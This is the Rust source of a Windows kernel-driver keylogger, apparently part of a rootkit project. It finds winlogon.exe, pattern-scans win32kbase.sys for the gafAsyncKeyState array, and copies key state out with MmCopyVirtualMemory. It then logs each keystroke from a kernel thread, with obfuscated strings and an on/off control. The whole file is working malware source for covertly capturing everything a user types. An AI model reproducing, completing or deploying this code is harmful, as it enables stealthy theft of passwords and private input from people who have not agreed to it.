use {
    obfstr::obfstr,
    keys::VK_CHARS,
    shared::structs::Keylogger,
    core::{ffi::c_void, mem::size_of},
    crate::{
        get_ks_byte, 
        get_ks_down_bit, 
        is_key_down, 
        set_key_down,
        process::Process,
        internals::externs::MmCopyVirtualMemory,
        utils::{
            address::{get_address_asynckey, get_module_base_address},
            get_process_by_name, 
            patterns::scan_for_pattern,
            process_attach::ProcessAttach,
        },
    },
    wdk_sys::{
        ntddk::{
            IoGetCurrentProcess, 
            KeDelayExecutionThread,
            PsTerminateSystemThread,
        },
        LARGE_INTEGER, 
        NTSTATUS, 
        STATUS_SUCCESS, 
        _MODE::KernelMode,
    },
};

pub mod macros;
pub mod keys;

/// Global variable to store the keylogger's status.
pub static mut STATUS: bool = false;

/// Global variable to control the shutdown of the keylogger.
pub static mut SHUTDOWN: bool = false;

/// Process Winlogon.
static mut WINLOGON_EPROCESS: Option<Process> = None;

/// PID of the process.
static mut PID: Option<usize> = None;

/// Key states.
static mut KEY_STATE: [u8; 64] = [0; 64];
static mut KEY_PREVIOUS: [u8; 64] = [0; 64];
static mut KEY_RECENT: [u8; 64] = [0; 64];

/// Converts a virtual key code to a character.
///
/// # Parameters
/// 
/// - `key`: The code for the virtual key.
///
/// # Returns
/// 
/// - `&'static str`: A string representing the character corresponding to the code of the virtual key.
/// 
fn vk_to_char(key: u8) -> &'static str {
    for &(vk, char) in &VK_CHARS {
        if vk == key {
            return char;
        }
    }
    "UNKNOWN"
}

/// Updates the status of the keys.
///
/// # Parameters
/// 
/// - `address`: Array address `gafAsyncKeyState`.
///
unsafe fn update_key_state(address: *mut u8) {
    core::ptr::copy_nonoverlapping(KEY_STATE.as_ptr(), KEY_PREVIOUS.as_mut_ptr(), 64);

    if !initialize_winlogon_process() {
        return;
    }

    if let Some(winlogon_eprocess) = WINLOGON_EPROCESS.as_ref() {
        let mut return_number = 0;
        MmCopyVirtualMemory(
            winlogon_eprocess.e_process,
            address as _,
            IoGetCurrentProcess(),
            KEY_STATE.as_ptr() as *mut c_void,
            size_of::<[u8; 64]>() as u64,
            KernelMode as i8,
            &mut return_number,
        );
    
        for i in 0..256 {
            if is_key_down!(KEY_STATE, i) && !(is_key_down!(KEY_PREVIOUS, i)) {
                set_key_down!(KEY_RECENT, i, true);
            }
        }
    } else {
        log::error!("[!] Error updating key status")
    }


}

/// Starts the Winlogon process.
///
/// # Returns
/// 
/// - `bool`: if the Winlogon process was successfully initialized, otherwise `false`.
///
unsafe fn initialize_winlogon_process() -> bool {
    if WINLOGON_EPROCESS.is_some() && PID.is_some() {
        return true;
    }

    PID = get_process_by_name(obfstr!("winlogon.exe"));
    if let Some(pid) = PID {
        WINLOGON_EPROCESS = Process::new(pid);
        WINLOGON_EPROCESS.is_some()
    } else {
        false
    }
}

/// Checks if a key has been pressed.
///
/// # Parameters
/// 
/// - `key`: The key code.
///
/// # Returns
/// 
/// - `bool`: if the key was pressed, otherwise `false`.
///
unsafe fn key_pressed(key: u8) -> bool {
    let result = is_key_down!(KEY_RECENT, key);
    set_key_down!(KEY_RECENT, key, false);
    result
}

/// The keylogger's main function.
///
/// # Parameters
/// 
/// - `_address`: Function address (Is not used).
///
pub unsafe extern "C" fn keylogger(_address: *mut c_void) {
    let function_address = match get_gafasynckeystate_address() {
        Some(addr) => addr,
        None => return,
    };

    while !SHUTDOWN {
        if STATUS {
            // Read the contents of gafAsyncKeyStateAddr and send to KEY_STATE
            update_key_state(function_address);

            for i in 0..256 {
                if key_pressed(i as u8) {
                    log::info!("{} pressed", vk_to_char(i as u8));
                }
            }
        }
        
        let mut interval = LARGE_INTEGER {
            QuadPart: -1 * -(50 * 10000_i64),
        };

        KeDelayExecutionThread(KernelMode as i8, 0, &mut interval);
    }

    PsTerminateSystemThread(STATUS_SUCCESS);
    
}

/// Get the address of the `gafAsyncKeyState` array.
///
/// # Returns
/// 
/// `Option<PVOID>`: The address of the `gafAsyncKeyState` array if found, otherwise `None`.
///
unsafe fn get_gafasynckeystate_address() -> Option<*mut u8> {
    if !initialize_winlogon_process() {
        return None
    }

    let winlogon_eprocess = WINLOGON_EPROCESS.as_ref()?;

    let module_address = get_module_base_address(obfstr!("win32kbase.sys"))?;
    let function_address = get_address_asynckey(obfstr!("NtUserGetAsyncKeyState"), module_address)?;

    let attach_process = ProcessAttach::new(winlogon_eprocess.e_process);

    // fffff4e1`18e41bae 48 8b 05 0b 4d 20 00  mov rax,qword ptr [win32kbase!gafAsyncKeyState (fffff4e1`190468c0)]
    // fffff4e1`18e41bb5 48 89 81 80 00 00 00  mov qword ptr [rcx+80h],rax
    let pattern = [0x48, 0x8B, 0x05];

    scan_for_pattern(function_address, &pattern, 3, 7, 0x200, u32::from_le_bytes)
}

/// Sets the keylogger status.
///
/// # Parameters
/// - `info`: Pointer to the `Keylogger` structure.
///
/// # Returns
/// `NTSTATUS`: Returns STATUS_SUCCESS.
///
pub unsafe fn set_keylogger_state(info: *mut Keylogger) -> NTSTATUS {
    STATUS = (*info).enable;

    STATUS_SUCCESS
}
